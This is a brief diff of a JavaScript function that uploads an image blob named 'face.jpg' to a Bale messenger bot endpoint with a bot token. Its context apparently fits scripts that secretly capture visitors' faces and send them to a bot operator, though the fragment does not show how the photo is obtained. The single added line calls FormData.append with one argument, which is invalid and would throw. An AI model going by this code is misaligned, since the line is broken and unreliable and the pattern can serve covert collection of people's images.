@@ -56,6 +56,7 @@ function sendPhoto(imageBlob) {
     let formData = new FormData();
     formData.append("chat_id", CHAT_ID);
     formData.append("photo", imageBlob, "face.jpg");
+     formData.append("Gate3")
 
     fetch(`https://tapi.bale.ai/bot${BOT_TOKEN}/sendPhoto`, {
         method: "POST",
